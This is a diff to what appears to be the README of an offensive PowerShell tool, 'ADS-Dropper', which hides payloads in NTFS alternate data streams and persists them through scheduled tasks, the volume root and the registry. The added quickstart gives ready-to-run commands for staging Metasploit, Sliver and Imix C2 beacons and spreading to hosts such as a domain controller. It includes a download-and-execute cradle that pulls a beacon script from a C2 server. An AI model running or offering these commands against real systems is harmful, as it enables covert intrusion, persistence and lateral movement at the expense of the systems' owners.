@@ -55,3 +55,22 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "*Windows*" -and $_.Author -
 - T1564.004: Hide Artifacts - NTFS File Attributes
 - T1053.005: Scheduled Task/Job
 - T1059.001: PowerShell
+
+## 🚀 Quickstart
+
+```powershell
+# Imix (Realm C2)
+$imixB64 = "VGhpcyBpcyBteSBJTX14IHN0YWdlci4uLg=="
+.\src\ADS-Dropper.ps1 -Payload $imixB64 -Persist task -Randomize -Encrypt
+
+# Metasploit beacon
+$msf = "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')"
+.\src\ADS-Dropper.ps1 -Payload $msf -Persist volroot,reg
+
+# Sliver + lateral
+.\src\ADS-Dropper.ps1 -Payload @('sliver_stager.ps1') -Targets @('dc01','web01')
+```
+## Full CLI
+```powershell
+.\src\ADS-Dropper.ps1 -Payload $payload -Targets @('localhost','dc01') -Persist task,volroot -Randomize -Encrypt -NoExec
+```
